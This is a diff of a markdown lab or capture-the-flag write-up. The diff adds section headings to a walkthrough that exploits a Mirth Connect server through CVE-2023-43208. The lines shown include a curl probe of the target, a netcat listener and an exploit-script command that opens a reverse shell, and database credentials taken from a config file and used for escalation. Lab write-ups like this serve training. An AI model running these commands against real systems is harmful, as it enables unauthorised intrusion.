@@ -1,5 +1,7 @@
 ![](Assets/Pasted%20image%2020260425141620.png)
 
+## 1. Reconnaissance & Enumeration
+
 First we make ping that we have connection
 
 ![](Assets/Pasted%20image%2020260425142258.png)
@@ -55,6 +57,8 @@ curl -k -s https://10.129.47.6/api/server/version
 </html>
 ```
 
+## 2. Vulnerability Discovery
+
 Here we see that it does not bring us what we want but, we see that this header asks us `X-Requested-With`
 
 Then we will do a second consultation.
@@ -99,8 +103,10 @@ Explotation Flow:
 Once with that we just run the script, with a terminal listening on port 4444
 
 ```bash
+# Terminal 1
 nc -lvnp 4444
 
+# Terminal 2
 python3 CVE-2023-43208.py -u https:<target-ip> -lh <machine-vpn-ip> -lp 4444
 ```
 
@@ -149,6 +155,8 @@ Well, as we saw in the `ls` command, we will inspect the conf file to see what i
 database.username = mirthdb
 database.password = MirthPass123!
 ```
+
+## 4. Privilege Escalation
 
 With this we now connect to the database 
 
